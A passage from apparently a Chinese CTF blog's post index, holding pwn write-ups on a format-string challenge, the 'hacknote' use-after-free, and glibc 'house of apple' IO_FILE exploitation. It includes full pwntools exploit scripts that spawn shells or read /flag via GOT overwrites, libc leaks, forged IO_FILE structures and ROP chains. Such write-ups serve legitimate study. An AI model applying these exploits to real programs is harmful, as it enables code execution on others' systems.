retn\n\n函数的地址是0x080485A0，main函数的地址是0x080485ED发现只有后面四个字节不一样，所以修改后面四个字节就可了。\n解题exp:\nfrom pwn import *\n\nelf = ELF(&#39;./questions/1330703b472c4eaab999ffc141717c64&#39;)\n# r = remote(&#39;111.200.241.244&#39;, 55046)\nr = process(&#39;./questions/1330703b472c4eaab999ffc141717c64&#39;)\n\n_fini_array = 0x8049934\nmain_addr = 0x85ED\nstrlen_got_addr = elf.got[&#39;strlen&#39;]\nsystem_plt_addr = 0x8048490\n\npayload = b&#39;aa&#39;+p32(strlen_got_addr)+p32(strlen_got_addr+2)+p32(_fini_array) + \\\n    b&#39;%&#39;+bytes(str(0x804-0x20), encoding=&#39;utf8&#39;)+b&#39;c%13$hn&#39;+b&#39;%&#39;+bytes(str(0x8490-0x804), encoding=&#39;utf8&#39;) + \\\n    b&#39;c%12$hn&#39;+b&#39;%&#39;+bytes(str(0x85ed-0x8490), encoding=&#39;utf8&#39;)+b&#39;c%14$hn&#39;\nr.recvuntil(b&#39;Please tell me your name... &#39;)\nr.sendline(payload)\n\nr.recvuntil(b&#39;Please tell me your name... &#39;)\nr.sendline(&#39;/bin/sh&#39;)\n\nr.interactive()\n\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"hacknote","url":"/2021/12/20/hacknote/","content":"检查保护\n没有开启PIE。\nvoid __cdecl __noreturn main()&#123;  int v0; // eax  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_8048956();      read(0, buf, 4u);      v0 = atoi(buf);      if ( v0 != 2 )        break;      sub_80487D4();    &#125;    if ( v0 &gt; 2 )    &#123;      if ( v0 == 3 )      &#123;        sub_80488A5();      &#125;      else      &#123;        if ( v0 == 4 )          exit(0);LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v0 != 1 )        goto LABEL_13;      sub_8048646();    &#125;  &#125;&#125;\n\nunsigned int sub_8048646()&#123;  int v0; // ebx  int i; // [esp+Ch] [ebp-1Ch]  int size; // [esp+10h] [ebp-18h]  char buf[8]; // [esp+14h] [ebp-14h] BYREF  unsigned int v5; // [esp+1Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  if ( dword_804A04C &lt;= 5 )  &#123;    for ( i = 0; i &lt;= 4; ++i )    &#123;      if ( !*(&amp;ptr + i) )      &#123;        *(&amp;ptr + i) = malloc(8u);        if ( !*(&amp;ptr + i) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        **(&amp;ptr + i) = sub_804862B;        printf(&quot;Note size :&quot;);        read(0, buf, 8u);        size = atoi(buf);        v0 = *(&amp;ptr + i);        *(v0 + 4) = malloc(size);        if ( !*(*(&amp;ptr + i) + 1) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        printf(&quot;Content :&quot;);        read(0, *(*(&amp;ptr + i) + 1), size);        puts(&quot;Success !&quot;);        ++dword_804A04C;        return __readgsdword(0x14u) ^ v5;      &#125;    &#125;  &#125;  else  &#123;    puts(&quot;Full&quot;);  &#125;  return __readgsdword(0x14u) ^ v5;&#125;\n\nunsigned int sub_80487D4()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + v1) )  &#123;    free(*(*(&amp;ptr + v1) + 1));    free(*(&amp;ptr + v1));    puts(&quot;Success&quot;);  &#125;  return __readgsdword(0x14u) ^ v3;&#125;\n\nunsigned int sub_80488A5()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + v1) )    (**(&amp;ptr + v1))(*(&amp;ptr + v1));  return __readgsdword(0x14u) ^ v3;&#125;\n\n流程分析题目流程很简单，就是一道菜单题目，创建chunk的时候不存在堆溢出，但是释放chunk之后又没有清除指针，很明显的UAF\n利用分析首先随便创建三个chunk，然后再创建一个大小为0x8的chunk，这时候我们可以控制的chunk就是每一次自动创建的chunk，再利用sub_80488A5这个函数即可。题目很简单直接给exp\nexpfrom pwn import *elf = ELF(&#x27;./hacknote&#x27;)libc = ELF(&#x27;./libc_32.so.6&#x27;)r = process(&#x27;./hacknote&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 49789)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Note size :&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content :&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index :&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def show(id):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index :&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def exit():    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;4&#x27;)create(0x20, b&#x27;a&#x27;*0x20)create(0x20, b&#x27;b&#x27;*0x20)create(0x20, b&#x27;b&#x27;*0x20)delete(0)delete(1)puts_addr = 0x804862Bputs_got = elf.got[&#x27;puts&#x27;]payload = p32(puts_addr)+p32(puts_got)create(0x8, payload)show(0)puts_real_addr = u32(r.recv(4))libc_base = puts_real_addr-libc.symbols[&#x27;puts&#x27;]system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))delete(3)print(system_addr)print(bin_sh_addr)payload = p32(system_addr)+b&#x27;||sh&#x27;create(0x8, payload)# gdb.attach(r)show(0)r.interactive()\n\n解释一下为什么使用||sh而不是用bin_sh_addr，我一开始也是一直想不通。\nif ( *(&amp;ptr + v1) )  (**(&amp;ptr + v1))(*(&amp;ptr + v1));return __readgsdword(0x14u) ^ v3;\n\n我们执行的是show函数的这一句\n可以看到虽然我们构造的是sub_804862B这个函数的地址和puts的got表，但是我们下面都已经输出了我们recv的地址但是上面0x2d前面还存在其他数据，就是因为我们执行的参数并不是只是got表，是chunk的那一坨都要执行。\n所以我们最终的payload其实是执行system(note)，参数就是地址+||sh地址是肯定执行失败的所以会执行sh\n","categories":["pwn-xctf"],"tags":["UAF"]},{"title":"house of apple","url":"/2022/07/26/house-of-apple/","content":"简单介绍在高版本中large bin attack算是为数不多的可以任意地址写堆地址的方法。\n这一利用方式是相较于其他house of 系列来说存在一定差异，它不是直接通过IO_FILE getshell是通过扩大现存的写堆地址漏洞的方式，从而辅佐其他house of 系列。\n利用条件\n程序从main函数返回或能调用exit函数\n能泄露出heap地址和libc地址\n能使用一次largebin attack\n\n利用原理调用链和house of pig一致：\nexit=&gt;fcloseall=&gt;_IO_cleanup=&gt;_IO_flush_all_lockp=&gt;_IO_OVERFLOW\n首先在vtbale中存在这样一个函数：\nstatic wint_t_IO_wstrn_overflow (FILE *fp, wint_t c)&#123;  /* When we come to here this means the user supplied buffer is     filled.  But since we must return the number of characters which     would have been written in total we must provide a buffer for     further use.  We can do this by writing on and on in the overflow     buffer in the _IO_wstrnfile structure.  */  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;   if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)    &#123;      _IO_wsetb (fp, snf-&gt;overflow_buf,         snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)                      / sizeof (wchar_t)), 0);       fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf                      + (sizeof (snf-&gt;overflow_buf)                     / sizeof (wchar_t)));    &#125;   fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;   /* Since we are not really interested in storing the characters     which do not fit in the buffer we simply ignore it.  */  return c;&#125;\n\n首先是将fp转化为_IO_wstrnfile结构体\ntypedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  wchar_t overflow_buf[64];&#125; _IO_wstrnfile;\n\n根据上面，如果通过fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf判断则会对fp-&gt;_wide_data的_IO_write_base、_IO_read_base、_IO_read_ptr和_IO_read_end赋值为snf-&gt;overflow_buf或者与该地址一定范围内偏移的值，最后对fp-&gt;_wide_data的_IO_write_ptr和_IO_write_end赋值。\n只要控制了fp-&gt;_wide_data，就可以控制从fp-&gt;_wide_data开始一定范围内的内存的值，也就等同于任意地址写已知地址\n不过可以看到在赋值之前会路过这一函数：\nvoid_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)&#123;  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))    free (f-&gt;_wide_data-&gt;_IO_buf_base);  f-&gt;_wide_data-&gt;_IO_buf_base = b;  f-&gt;_wide_data-&gt;_IO_buf_end = eb;  if (a)    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;  else    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;&#125;\n\n所以一般来说需要绕过free函数，所以我们可以控制_flags2=8即可\n随后就是_IO_wstrnfile结构体涉及到其他结构体：\nstruct _IO_str_fields&#123;  _IO_alloc_type _allocate_buffer_unused;  _IO_free_type _free_buffer_unused;&#125;; struct _IO_streambuf&#123;  FILE _f;  const struct _IO_jump_t *vtable;&#125;; typedef struct _IO_strfile_&#123;  struct _IO_streambuf _sbf;  struct _IO_str_fields _s;&#125; _IO_strfile; typedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  char overflow_buf[64];&#125; _IO_strnfile;  typedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  wchar_t overflow_buf[64];&#125; _IO_wstrnfile;\n\n因为其中存在着其他结构体，最后可以看出来overflow_buf的偏移量位0xf0，那就是在vtable后面\n而struct _IO_wide_data结构体如下：\nstruct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;    /* Current read pointer */  wchar_t *_IO_read_end;    /* End of get area. */  wchar_t *_IO_read_base;    /* Start of putback+get area. */  wchar_t *_IO_write_base;    /* Start of put area. */  wchar_t *_IO_write_ptr;    /* Current put pointer. */  wchar_t *_IO_write_end;    /* End of put area. */  wchar_t *_IO_buf_base;    /* Start of reserve area. */  wchar_t *_IO_buf_end;        /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;    /* Pointer to first valid character of                   backup area */  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */   __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;\n\n最后呢，也就是在调用vtable之前需要绕过的一点是：\nint_IO_flush_all_lockp (int do_lock)&#123;  int result = 0;  FILE *fp;#ifdef _IO_MTSAFE_IO  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);#endif  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)    &#123;      run_fp = fp;      if (do_lock)\t_IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\t   || (_IO_vtable_offset (fp) == 0\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\t   )\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\tresult = EOF;      if (do_lock)\t_IO_funlockfile (fp);      run_fp = NULL;    &#125;#ifdef _IO_MTSAFE_IO  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (0);#endif  return result;&#125;\n\n构造方式这里我看原创文章的构造描述和他写的demo的构造方式存在一定差异，所以我这里根据下面的demo来描述构造方式：\n\n首先修改vtable的值为：_IO_wstrn_jumps\n绕过free，修改_flags2的值为8\n修改_IO_write_ptr的值为-1\n最后修改_wide_data的地址为我们的目标地址\n\n利用思路这里修改mp_结构体和global_max_fast就不再赘述，这两者的攻击方式类似，这里重点提一下如何配合house of pig\n与house of pig的联用在我之前的FSOP这篇文章的关于vtable的检验实际上并不完善，其中只提到了检验内部vtable，关于外部vtable的检验没怎么提。\n_IO_vtable_check (void)&#123;#ifdef SHARED  /* Honor the compatibility flag.  */  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE  PTR_DEMANGLE (flag);#endif  if (flag == &amp;_IO_vtable_check)    return;  /* In case this libc copy is in a non-default namespace, we always     need to accept foreign vtables because there is always a     possibility that FILE * objects are passed across the linking     boundary.  */  &#123;    Dl_info di;    struct link_map *l;    if (!rtld_active ()        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))      return;  &#125;#else /* !SHARED */  /* We cannot perform vtable validation in the static dlopen case     because FILE * handles might be passed back and forth across the     boundary.  Therefore, we disable checking in this case.  */  if (__dlopen != NULL)    return;#endif  __libc_fatal (&quot;Fatal error: glibc detected an invalid stdio handle\\n&quot;);&#125;\n\n可以看到这里如果我们的flag值等于_IO_vtable_check的值，函数就会立即返回\n\n通过汇编代码可知这里是将IO_accept_foreign_vtables经过PTR_DEMANGLE这样一个函数的变化最后进行比较，而在house of emma中这个函数的本质就是上面汇编中显示的循环右移0x11然后与fs:0x30也就是pointer_guard进行异或。所以，如果pointer_guard和IO_accept_foreign_vtables是我们已知的值，我们即可绕过这一判断。最后任意伪造vtable劫持程序执行流即可。\n与house of emma联用相较于上面的需要进行两次任意地址写的情况，这一利用方式算是比较简单，只需要通过house of apple修改pointer_guard的值，随后进行house of emma即可。\n例题演示例题使用的方式为house of apple &amp; house of emma\n因为原创已经分析过了，这里就不再分析了，这里主要提一下堆风水即可。\n首先题目申请chunk的size只能申请三种，分别是：key+0x10，key+0x20，2*key+0x10\n并且题目的输入只能输入一次，所以我们需要在修改掉已经在large bin中的chunk的bk_nextsize的指针的同时修改掉即将进入large bin的chunk的内容为我们伪造的IO_FILE结构体。\n所以我们的目标是，有一个指针指向我们已经在large bin中的chunk，并且在这个chunk的内部还存在一个我们即将进入large bin的chunk，并且我们还希望，在修改bk_nextsize之后紧接着就可以修改掉后一个chunk的内容，让我们可控的内容尽可能的多一点。(其实仔细思考一下发现我们完全可以构造成ptr，ptr+0x30效果也是差不多，构造起来还较为简单一点)\nexpfrom pwn import *elf = ELF(&#x27;./oneday&#x27;)r = process(&#x27;./oneday&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(opt):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;choise: &#x27;)    r.sendline(bytes(str(opt), encoding=&#x27;utf-8&#x27;))def delete(idx):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def edit(idx, msg):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Message:&#x27;)    r.send(msg)def show(idx):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def pack_file(IO_write_base=0,              IO_write_ptr=0,              _chain=0,              _lock=0,              _wide_data=0,              _mode=0,              vtable=0):    IO_FILE = b&#x27;\\x00&#x27; * 0x20 + p64(IO_write_base) + p64(IO_write_ptr)    IO_FILE = IO_FILE.ljust(0x68, b&#x27;\\x00&#x27;) + p64(_chain) + p32(0) + p32(8)    IO_FILE = IO_FILE.ljust(0x88, b&#x27;\\x00&#x27;) + p64(_lock)    IO_FILE = IO_FILE.ljust(0xa0, b&#x27;\\x00&#x27;) + p64(_wide_data)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;) + p64(_mode)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;) + p64(vtable)    return IO_FILEdef ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;enter your key &gt;&gt;&#x27;)r.sendline(b&#x27;10&#x27;)create(2)create(2)create(1)delete(2)delete(1)delete(0)create(1)create(1)create(1)create(1)delete(3)delete(5)show(3)r.recvuntil(b&#x27;Message: \\n&#x27;)libc_base = u64(r.recv(8)) - 0x1f2cc0heap_base = u64(r.recv(8)) - 0x17f0print(hex(heap_base))print(hex(libc_base))_IO_list_all = libc_base + 0x1f3660pop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))point_guard_addr = libc_base + 0x3c0770 - 0x10_IO_wstrn_jumps = libc_base + 0x1f3d20_IO_cookie_jumps = libc_base + 0x1f3ae0gadget = libc_base + 0x146020setcontext = libc_base + 0x50bc0open_addr = libc_base + libc.symbols[&#x27;open&#x27;]read_addr = libc_base + libc.symbols[&#x27;read&#x27;]write_addr = libc_base + libc.symbols[&#x27;write&#x27;]flag_addr = heap_base + 0x1a88delete(4)delete(6)create(3)create(1)create(1)file1 = pack_file(0, 1, heap_base + 0x1900, libc_base + 0x1f5720,                  point_guard_addr, 0, _IO_wstrn_jumps)file2 = pack_file(0, 1, 0, libc_base + 0x1f5720, 0, 0, _IO_cookie_jumps + 0x58)delete(8)create(3)payload = flat(0, _IO_list_all - 0x20, 0, 0xa81) + file1[0x10:]payload = payload.ljust(0x100, b&#x27;\\x00&#x27;) + file2 + flat(    heap_base + 0x1900 + 0x100, ROL(gadget ^ (heap_base + 0x1900), 0x11))payload = payload.ljust(0x108 + 0x20, b&#x27;\\x00&#x27;) + p64(setcontext + 61)payload = payload.ljust(0x108 + 0x68, b&#x27;\\x00&#x27;) + p64(flag_addr) + p64(0)payload = payload.ljust(    0x108 + 0xa0, b&#x27;\\x00&#x27;) + p64(heap_base + 0x1900 + 0x200) + p64(open_addr)payload = payload.ljust(    0x200, b&#x27;\\x00&#x27;) + flat(pop_rdi, 3, pop_rsi, libc_base + libc.bss() + 0x100,                           pop_rdx, 0x100, read_addr)payload = payload + flat(pop_rdi, 1, pop_rsi, libc_base + libc.bss() + 0x100,                         pop_rdx, 0x100, write_addr) + b&#x27;/flag\\x00\\x00\\x00&#x27;payload = payload.ljust(0xa90, b&#x27;\\x00&#x27;) + flat(0, 0xab1)payload = payload.ljust(0xaa0, b&#x27;\\x00&#x27;)edit(5, payload)delete(2)create(3)print(hex(libc_base + libc.bss() + 0x100))gdb.attach(    r,    &#x27;b*$rebase(0x1439)\\ndir ../glibc_source/glibc-2.34/libio/\\nb _IO_wstrn_overflow&#x27;)r.recvuntil(b&#x27;enter your command:&#x27;)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n总结house of apple与以往的house of系列存在一定区别，他的效果只是任意地址写堆地址，将_IO_FILE地址+0xf0的地址写到_IO_wide_data所指向的地址(当然结合源码看的话可以看出来是进行一定范围的写操作)\n其实house of apple只是单纯的利用fcloseall函数会循环调用_IO_FILE的_chain，也就是利用一次任意地址写的机会进行多次_IO_FILE利用\n\n参考链接：https://bbs.pediy.com/thread-273418.htm\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of apple续","url":"/2022/08/05/house-of-apple2/","content":"死都想不到house of apple居然有三篇文章，这里就把第二篇和第三篇合并起来一起学完吧。\nhouse of apple2利用条件：\n已知heap地址和glibc地址\n\n能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发\n\n能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制\n\n\n利用原理在https://cv196082.gitee.io/2022/02/23/FSOP/ 这篇文章中详细介绍了去调用vtable中的函数指针时会经过什么验证。\nstruct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;    /* Current read pointer */  wchar_t *_IO_read_end;    /* End of get area. */  wchar_t *_IO_read_base;    /* Start of putback+get area. */  wchar_t *_IO_write_base;    /* Start of put area. */  wchar_t *_IO_write_ptr;    /* Current put pointer. */  wchar_t *_IO_write_end;    /* End of put area. */  wchar_t *_IO_buf_base;    /* Start of reserve area. */  wchar_t *_IO_buf_end;        /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;    /* Pointer to first valid character of                   backup area */  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */   __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;\n\n注意_IO_wide_data结构体中存在_wide_vtable成员，在调用_wide_vtable虚表是同样会经过一系列宏去调用：\n#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable\n\n在这里调用的顺序中没有出现vtable是否合法的检测，因此我们可以劫持_IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可以控制的堆空间，进一步控制_wide_data-&gt;_wide_vtable指向可以控制的堆地址，控制程序IO流函数调用，最终调用到IO_wxxxxx\n利用思路这里最终目的是调用_wide_vtable成员，所以需要找到上述宏的调用，最终发现只存在以下四个：_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE、_IO_WOVERFLOW\n并且其中前两个还是利用难度较高，甚至是无法利用。下面从原文的三个方向出发\n_IO_wfile_overflow这里的调用链为：_IO_wfile_overflow=&gt;_IO_wdoallocbuf=&gt;_IO_WDOALLOCATE=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable+ 0x68)(fp)\nwint_t    _IO_wfile_overflow (FILE *f, wint_t wch)&#123;    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;        f-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    /* If currently reading or no buffer allocated. */    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)    &#123;        /* Allocate a buffer if needed. */        if (f-&gt;_wide_data-&gt;_IO_write_base == 0)        &#123;            _IO_wdoallocbuf (f);           ......        &#125;    &#125;&#125;\n\n需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0\n接着看_IO_wdoallocbuf\nvoid_IO_wdoallocbuf (FILE *fp)&#123;  if (fp-&gt;_wide_data-&gt;_IO_buf_base)    return;  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)      return;  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);&#125;libc_hidden_def (_IO_wdoallocbuf)\n\n这里就调用了IO_Wxxxx并且需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。\n所以总的来说构造方式为：\n\n_flags = ~(2 | 0x8 | 0x800)即可，所以可以直接设置为0或者这值为  sh;\nvtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0\n_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C\n\n_IO_wfile_underflow_mmap调用链：_IO_wfile_underflow_mmap=&gt;_IO_wdoallocbuf=&gt;_IO_WDOALLOCATE=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable +0x68)(fp)\nstatic wint_t_IO_wfile_underflow_mmap (FILE *fp)&#123;  struct _IO_codecvt *cd;  const char *read_stop;   if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return WEOF;    &#125;  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;   cd = fp-&gt;_codecvt;   /* Maybe there is something left in the external buffer.  */  if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end      /* No.  But maybe the read buffer is not fully set up.  */      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error       flags as appropriate.  */    return WEOF;   /* There is more in the external.  Convert it.  */  read_stop = (const char *) fp-&gt;_IO_read_ptr;   if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)    &#123;      /* Maybe we already have a push back pointer.  */      if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)    &#123;      free (fp-&gt;_wide_data-&gt;_IO_save_base);      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;    &#125;      _IO_wdoallocbuf (fp);    &#125;    ......&#125;\n\n这里需要改写的有点略多了，需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。\n构造方式：\n\n_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为  sh;\nvtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可\n_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0\n_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C\n\n_IO_wdefault_xsgetn调用链：_IO_wdefault_xsgetn=&gt;__wunderflow=&gt;_IO_switch_to_wget_mode=&gt;_IO_WOVERFLOW=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable+0x18)(fp)\nsize_t    _IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)&#123;    size_t more = n;    wchar_t *s = (wchar_t*) data;    for (;;)    &#123;        /* Data available. */        ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end                         - fp-&gt;_wide_data-&gt;_IO_read_ptr);        if (count &gt; 0)        &#123;            if ((size_t) count &gt; more)                count = more;            if (count &gt; 20)            &#123;                s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);                fp-&gt;_wide_data-&gt;_IO_read_ptr += count;            